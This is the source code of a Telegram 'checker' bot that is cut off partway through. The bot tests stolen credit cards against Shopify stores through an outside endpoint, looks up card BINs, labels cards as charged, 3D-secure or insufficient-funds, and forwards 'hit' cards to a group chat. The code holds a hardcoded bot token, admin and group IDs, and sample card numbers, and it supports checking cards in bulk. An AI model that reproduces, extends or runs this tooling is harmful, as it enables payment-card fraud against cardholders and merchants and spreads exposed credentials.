import requests
import time
import threading
import re
from urllib.parse import urlparse
from telebot import TeleBot, types
import os
import json
from datetime import datetime
import random
import asyncio
from concurrent.futures import ThreadPoolExecutor

# Initialize bot with your token
bot = TeleBot("8528695397:AAEX0oVUQzZxKlfE4tzYxmI95krguZ0JKgM")

# Data storage
USER_SITES = {}  # Format: {user_id: [{"url": "site1", "price": "1.0", "working": True}, ...]}
USER_CHECKS = {}  # Store ongoing mass checks
BANNED_USERS = set()  # Banned user IDs
ADMIN_IDS = [5994305183]  # Admin user IDs - FIXED: Added your admin ID
ALLOWED_CHAT_IDS = set()  # Add allowed chat IDs here
GROUP_CHAT_ID = -1003232934009  # Replace with your group chat ID
CHANNEL_USERNAME = "@solo_rohan"  # Channel to check subscription
SUBSCRIBED_USERS = set()  # Users who have subscribed
PENDING_APPROVAL = {}  # Users pending admin approval
APPROVED_USERS = set()  # Approved users who can use all features

# Thread pool for parallel processing
executor = ThreadPoolExecutor(max_workers=10)

# Load data from files
def load_data():
    global USER_SITES, BANNED_USERS, ALLOWED_CHAT_IDS, SUBSCRIBED_USERS, APPROVED_USERS
    try:
        if os.path.exists("user_sites.json"):
            with open("user_sites.json", "r") as f:
                loaded_data = json.load(f)
                # Convert string keys back to integers
                USER_SITES = {int(k): v for k, v in loaded_data.items()}
        if os.path.exists("banned_users.json"):
            with open("banned_users.json", "r") as f:
                BANNED_USERS = set(json.load(f))
        if os.path.exists("allowed_chats.json"):
            with open("allowed_chats.json", "r") as f:
                ALLOWED_CHAT_IDS = set(json.load(f))
        if os.path.exists("subscribed_users.json"):
            with open("subscribed_users.json", "r") as f:
                SUBSCRIBED_USERS = set(json.load(f))
        if os.path.exists("approved_users.json"):
            with open("approved_users.json", "r") as f:
                APPROVED_USERS = set(json.load(f))
    except Exception as e:
        print(f"Error loading data: {e}")

def save_data():
    with open("user_sites.json", "w") as f:
        json.dump(USER_SITES, f)
    with open("banned_users.json", "w") as f:
        json.dump(list(BANNED_USERS), f)
    with open("allowed_chats.json", "w") as f:
        json.dump(list(ALLOWED_CHAT_IDS), f)
    with open("subscribed_users.json", "w") as f:
        json.dump(list(SUBSCRIBED_USERS), f)
    with open("approved_users.json", "w") as f:
        json.dump(list(APPROVED_USERS), f)

load_data()

# Status mappings
status_emoji = {
    'APPROVED': '✅',
    'APPROVED_OTP': '🔐',
    'DECLINED': '❌',
    'EXPIRED': '⌛',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': 'APPROVED',
    'APPROVED_OTP': '3D SECURE',
    'DECLINED': 'DECLINED',
    'EXPIRED': 'EXPIRED',
    'ERROR': 'ERROR'
}

# Cache for frequent operations
BIN_CACHE = {}
SITE_CACHE = {}
CACHE_TIMEOUT = 300  # 5 minutes

# Performance optimization: Connection pooling
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})

# Enhanced flood control with caching
def flood_control(func):
    user_requests = {}
    
    def wrapper(message, *args, **kwargs):
        user_id = message.from_user.id
        
        # Check if user is banned
        if user_id in BANNED_USERS:
            bot.reply_to(message, "❌ You are banned from using this bot.")
            return
            
        # Check subscription for private chats
        if message.chat.type == 'private':
            if user_id not in SUBSCRIBED_USERS:
                check_subscription(message)
                return
            if user_id not in APPROVED_USERS and user_id not in ADMIN_IDS:
                if user_id in PENDING_APPROVAL:
                    bot.reply_to(message, "⏳ Your request is pending admin approval. Please wait.")
                else:
                    request_approval(message)
                return
                    
        # Rate limiting
        current_time = time.time()
        if user_id in user_requests:
            last_time, count = user_requests[user_id]
            if current_time - last_time < 1:  # 1 second window
                if count > 5:  # More than 5 requests per second
                    bot.reply_to(message, "⏳ Too many requests. Please slow down.")
                    return
                user_requests[user_id] = (last_time, count + 1)
            else:
                user_requests[user_id] = (current_time, 1)
        else:
            user_requests[user_id] = (current_time, 1)
            
        # Clear old entries periodically
        if len(user_requests) > 1000:
            old_time = current_time - 60
            user_requests = {uid: data for uid, data in user_requests.items() 
                           if data[0] > old_time}
            
        return func(message, *args, **kwargs)
    return wrapper

def check_subscription(message):
    """Check if user is subscribed to channel"""
    user_id = message.from_user.id
    try:
        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            SUBSCRIBED_USERS.add(user_id)
            save_data()
            
            # Show welcome message
            show_welcome_message(message)
            
            # Request admin approval
            request_approval(message)
        else:
            show_subscription_required(message)
    except Exception as e:
        print(f"Error checking subscription: {e}")
        show_subscription_required(message)

def request_approval(message):
    """Request admin approval for user - FIXED"""
    user_id = message.from_user.id
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "User"
    
    PENDING_APPROVAL[user_id] = {
        'username': username,
        'first_name': first_name,
        'timestamp': datetime.now().isoformat()
    }
    
    # Notify admins - FIXED: Proper notification with buttons
    for admin_id in ADMIN_IDS:
        try:
            markup = types.InlineKeyboardMarkup(row_width=2)
            approve_btn = types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")
            reject_btn = types.InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
            markup.add(approve_btn, reject_btn)
            
            bot.send_message(
                admin_id,
                f"📋 *NEW APPROVAL REQUEST*\n\n"
                f"👤 *User ID:* `{user_id}`\n"
                f"📝 *Username:* @{username}\n"
                f"👤 *Name:* {first_name}\n"
                f"🕐 *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"Select an action:",
                parse_mode='Markdown',
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error notifying admin: {e}")
    
    bot.reply_to(message, 
        "📋 *Your access request has been sent to admins for approval.*\n\n"
        "⏳ *Please wait while we review your request.*\n"
        "🔔 *You'll be notified once approved.*",
        parse_mode='Markdown'
    )

def show_subscription_required(message):
    """Show subscription required message"""
    markup = types.InlineKeyboardMarkup()
    channel_btn = types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")
    check_btn = types.InlineKeyboardButton("✅ Check Subscription", callback_data="check_subscription")
    markup.add(channel_btn, check_btn)
    
    bot.reply_to(message,
        "🔒 *ACCESS RESTRICTED*\n\n"
        "To use this bot, you must:\n"
        "1. Join our official channel\n"
        "2. Get admin approval\n\n"
        "This ensures security and prevents abuse.",
        parse_mode='Markdown',
        reply_markup=markup
    )

def show_welcome_message(message):
    """Show the welcome message like in screenshot"""
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    welcome_text = f"""
🔥 <b>𝐖𝐞𝐥𝐜𝐨𝐦𝐞 | 𝐍𝐨𝐱𝐢 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐎𝐓!</b> 

[⌬] <b>𝐍𝐨𝐱𝐢 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐕1⚡</b>
━━━━━━━━━━━━━━━━━━━━
🔥 <b>𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁𝐚𝐜𝐤</b> , {username} ⏤‌‌‌‌ 𓆩

[⌬] <b>𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒</b> : 𝐎𝐍 ✅

[⌬] <b>𝐓𝐎 𝐔𝐒𝐄 𝐓𝐇𝐄 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐂𝐓 𝐁𝐔𝐓𝐓𝐎𝐍 𝐁𝐄𝐋𝐎𝐖</b>
━━━━━━━━━━━━━━━━━━━━
"""
    
    # Add buttons for main features
    markup = types.InlineKeyboardMarkup(row_width=2)
    single_check = types.InlineKeyboardButton("🔄 Single Check", callback_data="single_check_info")
    mass_check = types.InlineKeyboardButton("📊 Mass Check", callback_data="mass_check_info")
    my_sites = types.InlineKeyboardButton("🌐 My Sites", callback_data="my_sites_info")
    add_site = types.InlineKeyboardButton("➕ Add Site", callback_data="add_site_info")
    add_bulk = types.InlineKeyboardButton("📁 Bulk Add Sites", callback_data="bulk_add_info")
    markup.add(single_check, mass_check, my_sites, add_site, add_bulk)
    
    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode='HTML',
        reply_markup=markup,
        disable_web_page_preview=True
    )

# Admin commands - FIXED: Added proper admin handling
@bot.message_handler(commands=['admin'])
@flood_control
def handle_admin(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Access denied.")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    stats_btn = types.InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")
    users_btn = types.InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")
    pending_btn = types.InlineKeyboardButton("⏳ Pending Approvals", callback_data="admin_pending")
    broadcast_btn = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    markup.add(stats_btn, users_btn, pending_btn, broadcast_btn)
    
    bot.reply_to(message,
        "🛠 *Admin Panel*\n\n"
        f"📊 *Total Users:* {len(USER_SITES)}\n"
        f"✅ *Approved Users:* {len(APPROVED_USERS)}\n"
        f"⏳ *Pending Approvals:* {len(PENDING_APPROVAL)}\n"
        f"❌ *Banned Users:* {len(BANNED_USERS)}\n\n"
        "*Select an option:*",
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def handle_admin_buttons(call):
    admin_id = call.from_user.id
    if admin_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied.")
        return
    
    if call.data == "admin_pending":
        if not PENDING_APPROVAL:
            bot.answer_callback_query(call.id, "✅ No pending approvals.")
            return
        
        text = "⏳ *Pending Approval Requests:*\n\n"
        for user_id, data in list(PENDING_APPROVAL.items()):
            text += f"👤 *User ID:* `{user_id}`\n"
            text += f"📝 *Username:* @{data['username']}\n"
            text += f"👤 *Name:* {data['first_name']}\n"
            text += f"🕐 *Time:* {data['timestamp'][:19]}\n"
            text += f"🔘 [Approve](t.me/{bot.get_me().username}?start=approve_{user_id}) | "
            text += f"[Reject](t.me/{bot.get_me().username}?start=reject_{user_id})\n\n"
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        bot.answer_callback_query(call.id, "📋 Pending approvals loaded.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('reject_'))
def handle_approval_buttons(call):
    admin_id = call.from_user.id
    if admin_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied.")
        return
    
    action, user_id_str = call.data.split('_')
    user_id = int(user_id_str)
    
    if action == 'approve':
        APPROVED_USERS.add(user_id)
        if user_id in PENDING_APPROVAL:
            del PENDING_APPROVAL[user_id]
        save_data()
        
        # Notify user
        try:
            bot.send_message(user_id,
                "✅ *ACCESS APPROVED*\n\n"
                "🎉 *Your request has been approved by admin!*\n"
                "✨ *You can now use all features of the bot!*\n\n"
                "👉 Use /start to begin.",
                parse_mode='Markdown'
            )
        except:
            pass
        
        bot.answer_callback_query(call.id, f"✅ User {user_id} approved.")
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"✅ *User {user_id} has been approved.*\n\n" + call.message.text,
            parse_mode='Markdown'
        )
    
    elif action == 'reject':
        if user_id in PENDING_APPROVAL:
            del PENDING_APPROVAL[user_id]
        
        # Notify user
        try:
            bot.send_message(user_id,
                "❌ *ACCESS DENIED*\n\n"
                "⚠️ *Your request has been rejected by admin.*\n"
                "📞 *Please contact support for more information.*",
                parse_mode='Markdown'
            )
        except:
            pass
        
        bot.answer_callback_query(call.id, f"❌ User {user_id} rejected.")
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"❌ *User {user_id} has been rejected.*\n\n" + call.message.text,
            parse_mode='Markdown'
        )

@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def handle_check_subscription(call):
    user_id = call.from_user.id
    try:
        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            SUBSCRIBED_USERS.add(user_id)
            save_data()
            bot.answer_callback_query(call.id, "✅ Subscription verified!")
            
            # Show welcome message
            show_welcome_message(call.message)
            
            # Request approval
            request_approval(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Please join the channel first.")
    except Exception as e:
        bot.answer_callback_query(call.id, "❌ Error checking subscription.")

# Performance optimized test_shopify_site with caching - FIXED
def test_shopify_site(url):
    """Test if a Shopify site is reachable and working with a test card - FIXED"""
    cache_key = f"site_test_{url}"
    current_time = time.time()
    
    # Check cache
    if cache_key in SITE_CACHE:
        cache_data, timestamp = SITE_CACHE[cache_key]
        if current_time - timestamp < CACHE_TIMEOUT:
            return cache_data
    
    try:
        test_card = "5547300001996183|11|2028|197"
        
        # FIXED: Using correct API parameters
        api_url = f"http://goatedsh.hopto.org/autog.php?cc={test_card}&site={url}"
        response = session.get(api_url, timeout=10)
        
        if response.status_code != 200:
            result = (False, "Site not reachable", "0.0", "shopify_payments", "No response")
            SITE_CACHE[cache_key] = (result, current_time)
            return result
        
        # Default values
        price = "1.0"
        gateway = "shopify_payments"
        api_message = "No response"

        try:
            data = response.json()
            api_message = data.get("Response", api_message)
            price = data.get("Price", price)
            gateway = data.get("Gateway", gateway)
        except:
            api_message = response.text.strip()[:100]

        result = (True, api_message, price, gateway, "Site is reachable and working")
        SITE_CACHE[cache_key] = (result, current_time)
        return result
        
    except Exception as e:
        result = (False, f"Error testing site: {str(e)[:50]}", "0.0", "shopify_payments", "Error")
        SITE_CACHE[cache_key] = (result, current_time)
        return result

# Enhanced BIN lookup with caching
def get_bin_info(bin_number):
    """Get BIN information with caching"""
    cache_key = f"bin_{bin_number}"
    current_time = time.time()
    
    # Check cache
    if cache_key in BIN_CACHE:
        cache_data, timestamp = BIN_CACHE[cache_key]
        if current_time - timestamp < CACHE_TIMEOUT:
            return cache_data
    
    try:
        response = session.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            BIN_CACHE[cache_key] = (data, current_time)
            return data
    except:
        pass
    
    # Return default data and cache it
    default_data = {
        'brand': 'UNKNOWN',
        'country': 'UNKNOWN',
        'country_flag': '🇺🇳',
        'type': 'UNKNOWN',
        'bank': 'UNKNOWN'
    }
    BIN_CACHE[cache_key] = (default_data, current_time)
    return default_data

# Performance optimized check_shopify_cc - FIXED
def check_shopify_cc(cc, site_info):
    """Check credit card on Shopify site with performance optimizations - FIXED"""
    try:
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        
        if len(parts) < 4:
            return {
                'status': 'ERROR', 
                'card': cc, 
                'message': 'Invalid format',
                'brand': 'UNKNOWN', 
                'country': 'UNKNOWN 🇺🇳', 
                'type': 'UNKNOWN',
                'bank': 'UNKNOWN',
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") and len(yy_raw) == 4 else yy_raw
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # Get BIN info with caching
        bin_info = get_bin_info(cc_num[:6])
        brand = bin_info.get('brand', 'UNKNOWN')
        country_name = bin_info.get('country', 'UNKNOWN')
        country_flag = bin_info.get('country_flag', '🇺🇳')
        card_type = bin_info.get('type', 'UNKNOWN')
        bank = bin_info.get('bank', 'UNKNOWN')

        # Check card with timeout - FIXED: Using correct API call
        api_url = f"http://goatedsh.hopto.org/autog.php?cc={formatted_cc}&site={site_info['url']}"
        
        try:
            response = session.get(api_url, timeout=15)
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'bank': bank,
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }
        
        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f'API Error: {response.status_code}',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'bank': bank,
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        response_text = response.text
        
        api_message = 'No response'
        price = site_info.get('price', '1.0')
        gateway = 'shopify_payments'
        status = 'DECLINED'
        
        # Parse response efficiently
        try:
            data = response.json()
            api_message = data.get('Response', 'No response')
            price = data.get('Price', price)
            gateway = data.get('Gateway', gateway)
        except:
            api_message = response_text[:100]
        
        response_upper = api_message.upper()
        if 'THANK YOU' in response_upper or 'ORDER' in response_upper:
            bot_response = 'ORDER CONFIRM!'
            status = 'APPROVED'
        elif '3D' in response_upper:
            bot_response = 'OTP_REQUIRED'
            status = 'APPROVED_OTP'
        elif 'EXPIRED_CARD' in response_upper:
            bot_response = 'EXPIRE_CARD'
            status = 'EXPIRED'
        elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
            bot_response = api_message
            status = 'APPROVED_OTP'
        elif any(x in response_upper for x in ['FRAUD_SUSPECTED', 'CARD_DECLINED']):
            bot_response = api_message
            status = 'DECLINED'
        else:
            bot_response = api_message
            status = 'DECLINED'
            
        return {
            'status': status,
            'card': formatted_cc,
            'message': bot_response,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'bank': bank,
            'gateway': f"Self Shopify [${price}]",
            'price': price
        }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Exception: {str(e)[:50]}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🇺🇳',
            'type': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
            'price': site_info.get('price', '1.0')
        }

# Stylish result formatting functions (unchanged)
def format_approved_response(result, user_full_name, processing_time, site_url):
    """Format approved cards in the stylish format"""
    # Determine status text based on response
    if 'INSUFFICIENT' in result['message'].upper():
        status_text = "Insufficient Funds 💰"
        status_icon = "💰"
    elif '3D' in result['message'].upper() or 'OTP' in result['message'].upper():
        status_text = "3D Secure 🔐"
        status_icon = "🔐"
    else:
        status_text = "Charged 🔥"
        status_icon = "🔥"

    return f"""
#Auto | Shopify
━━━━━━━━━━━━━━━━━━━
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬 ⌁ {status_text}
[⸙] 𝐂𝐚𝐫𝐝 ⌁ {result['card']}
[⸙] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ {result['gateway']}
[⸙] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ {result['message']}
━━━━━━━━━━━━━━━━━━━
[⸙] 𝐈𝐧𝐟𝐨 ⌁ {result['brand']} {result['type']}
[⸙] 𝐈𝐬𝐬𝐮𝐞𝐫 ⌁ {result['bank']}
[⸙] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
━━━━━━━━━━━━━━━━━━━
[⸙] 𝐒𝐢𝐭𝐞 ⌁ {site_url}
[⸙] 𝐑𝐞𝐪 ⌁ {user_full_name}
[⸙] 𝐃𝐞𝐯 ⌁ @solo_rohan
[⸙] 𝐓𝐢𝐦𝐞 ⌁ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
"""

def format_shopify_response(result, user_full_name, processing_time):
    """Format stylish response for different card statuses"""
    
    # Check if it's a HIT, INSUFFICIENT, or 3D card
    if result['status'] == 'APPROVED':
        # HIT card formatting - NEW STYLISH FORMAT
        return f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗛𝗜𝗧 𝗖𝗔𝗥𝗗 𝗙𝗢𝗨𝗡𝗗 ✅</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗖𝗮𝗿𝗱 ➳ <code>{result['card']}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>  
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐁𝐫𝐚𝐧𝐝 ⌁ {result['brand']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐓𝐲𝐩𝐞 ⌁ {result['type']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐁𝐚𝐧𝐤 ⌁ {result['bank']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐑𝐞𝐪 𝐁𝐲 ⌁ {user_full_name}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐃𝐞𝐯 ⌁ @solo_rohan
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗧𝗶𝗺𝗲 ⌁  {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    
    elif result['status'] == 'APPROVED_OTP' and 'INSUFFICIENT' in result['message'].upper():
        # INSUFFICIENT card formatting - NEW STYLISH FORMAT
        return f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 💰</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗖𝗮𝗿𝗱 ➳ <code>{result['card']}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>  
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐁𝐫𝐚𝐧𝐝 ⌁ {result['brand']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐓𝐲𝐩𝐞 ⌁ {result['type']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐁𝐚𝐧𝐤 ⌁ {result['bank']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐑𝐞𝐪 𝐁𝐲 ⌁ {user_full_name}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐃𝐞𝐯 ⌁ @solo_rohan
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗧𝗶𝗺𝗲 ⌁  {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    
    elif result['status'] == 'APPROVED_OTP':
        # 3D card formatting - NEW STYLISH FORMAT
        return f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝟯𝗗 𝗦𝗘𝗖𝗨𝗥𝗘 𝗖𝗔𝗥𝗗 🔐</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗖𝗮𝗿𝗱 ➳ <code>{result['card']}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>  
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐁𝐫𝐚𝐧𝐝 ⌁ {result['brand']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐓𝐲𝐩𝐞 ⌁ {result['type']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐁𝐚𝐧𝐤 ⌁ {result['bank']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐑𝐞𝐪 𝐁𝐲 ⌁ {user_full_name}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐃𝐞𝐯 ⌁ @solo_rohan
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗧𝗶𝗺𝗲 ⌁  {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    
    else:
        # Default formatting for other statuses - ORIGINAL STYLISH FORMAT
        return f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ {status_text[result['status']]} {status_emoji[result['status']]}</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗖𝗮𝗿𝗱
   ↳ <code>{result['card']}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>  
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐁𝐫𝐚𝐧𝐝 ⌁ {result['brand']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐓𝐲𝐩𝐞 ⌁ {result['type']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐁𝐚𝐧𝐤 ⌁ {result['bank']}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐑𝐞𝐪 𝐁𝐲 ⌁ {user_full_name}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝐃𝐞𝐯 ⌁ @solo_rohan
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗧𝗶𝗺𝗲 ⌁  {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""

def send_to_group(result, user_full_name, processing_time, site_url):
    """Send HIT and INSUFFICIENT cards to group"""
    try:
        if result['status'] in ['APPROVED', 'APPROVED_OTP']:
            # Use the stylish format for group messages
            group_message = format_approved_response(result, user_full_name, processing_time, site_url)
            
            bot.send_message(
                GROUP_CHAT_ID,
                group_message,
                parse_mode='HTML'
            )
    except Exception as e:
        print(f"Error sending to group: {e}")

# Update the start handler to show welcome message
@bot.message_handler(commands=['start'])
@flood_control
def handle_start(message):
    user_id = message.from_user.id
    
    # Check subscription first
    if user_id not in SUBSCRIBED_USERS and message.chat.type == 'private':
        check_subscription(message)
        return
    
    # Check approval for private chats
    if message.chat.type == 'private' and user_id not in APPROVED_USERS and user_id not in ADMIN_IDS:
        if user_id in PENDING_APPROVAL:
            bot.reply_to(message, "⏳ Your request is pending admin approval. Please wait.")
        else:
            request_approval(message)
        return
    
    # Show welcome message for approved users
    show_welcome_message(message)
    
    # Also show command list
    bot.send_message(
        message.chat.id,
        """
<b>🔹 Available Commands:</b>

<code>/seturl</code> - Add a Shopify site
<code>/maddurl</code> - Add multiple sites at once
<code>/msite</code> - Add sites from .txt file (auto-detect)
<code>/myurl</code> - View your sites
<code>/rmurl</code> - Remove a site
<code>/rmall</code> - Remove all sites
<code>/clean</code> - Clean non-working sites
<code>/sh</code> or <code>/chk</code> - Check a single card
<code>/mass</code> or <code>/mchk</code> - Mass check cards from .txt file
<code>/fl</code> - Filter and clean card file
<code>/msh</code> - Start mass check after uploading file

<b>🔹 Quick Start:</b>
1. Add your Shopify site with /seturl or /msite
2. Check cards with /sh or mass check with /mass
3. The bot will use your sites randomly for checking

<a href='https://t.me/solo_rohan'>➣ Developer: @solo_rohan</a>
        """,
        parse_mode='HTML',
        disable_web_page_preview=True
    )

# Add callback handlers for welcome message buttons
@bot.callback_query_handler(func=lambda call: call.data in [
    "single_check_info", "mass_check_info", "my_sites_info", 
    "add_site_info", "bulk_add_info"
])
def handle_welcome_buttons(call):
    if call.data == "single_check_info":
        bot.answer_callback_query(call.id, "Single Check Information")
        bot.send_message(
            call.message.chat.id,
            "<b>🔄 Single Card Checking</b>\n\n"
            "Format: <code>/sh CC|MM|YYYY|CVV</code>\n"
            "Example: <code>/sh 5275150407315878|05|2030|032</code>\n\n"
            "Or reply to a message containing card details with <code>/sh</code>",
            parse_mode='HTML'
        )
    
    elif call.data == "mass_check_info":
